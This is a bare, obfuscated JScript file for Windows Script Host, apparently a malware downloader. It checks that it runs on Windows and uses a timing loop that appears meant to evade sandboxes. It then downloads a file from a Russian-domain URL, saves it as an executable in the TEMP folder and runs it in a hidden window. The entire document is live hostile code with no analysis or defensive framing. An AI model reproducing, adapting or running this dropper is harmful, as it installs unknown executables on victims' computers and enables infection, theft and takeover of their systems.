var BA = false;
var VT = "Create"+"Object";
var W = function LQ() {return WScript[VT]("WScript"+".Shell");}(), Z0 = 11;
var EZ = "MSXML2"+".XMLHTTP";
var PT = 2;
var OC = PT - 2;
function FD(Y){W["Run"](Y, OC, OC);};
function RY(){return EZ + "";};
function NQ(XH, D){OC = OC * 1; return XH - D;};
function P(){return VT;};
/*@cc_on
  @if (@_win32 || @_win64)
    BA = true;
  @end
@*/
if (BA)
{
var WZ = "";
function XR(){return 22;};
var T0 = 0; var XL = 0;
function Z()
{
var RV = new this["Date"]();
var B0 = RV["getUTCMilliseconds"]();
WScript["Sleep"](XR());
var RV = new this["Date"]();
var NQ0 = RV["getUTCMilliseconds"]();
WScript["Sleep"](XR());
var RV = new this["Date"]();
var V = RV["getUTCMilliseconds"]();
var T0 = "S";
T0 = NQ(NQ0, B0);
var XL = "S0";
XL = NQ(V, NQ0);
WZ = "open";
return NQ(T0, XL);
}
var KB = false;
var GU = false;
for (var T = OC; T < XR() * 1; T++){if (Z() != OC){
KB = true; 
XL = "31" + 11 * T0 + XL; 
GU = true; 
break;
}}
function KR() {return ((KB == true) && (KB == GU)) ? 1 : OC;};
if (KB && KR() && GU){
function NE() {return W["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "OefP3dYvPJDeM.ex" + "e";};
 I = RY();
 S1 = WScript[VT](I);
 var SR = 1;
do { 
	for (;SR;){
	try {
		if (SR == 1)
		{
			S1[WZ]("GET", "http://zakaz-sharikov.ru/x9dslp", false);
			S1["send"]();
			WD = "Sleep";
			SR = 2;
		}
		WScript[WD](XR() + 120); 
		if (S1["readystate"] < 2 * 2) continue;
		SR = OC;
		function QB(CR) {var B = (1, 2, 3, 4, 5, CR); return B;};
		V0 = WScript[P()]("ADODB.Stream");
		I = V0;
		I[WZ]();
		I["type"] = QB(1);
		I["write"](S1["ResponseBody"]);
		V0["position"] = QB(OC);
		I["Save" + "ToFile"](NE(), 2);
		V0["cl"+"ose"]();
		R = NE();
		FD(R);
	} catch(L){};};
}while (SR);
}
}

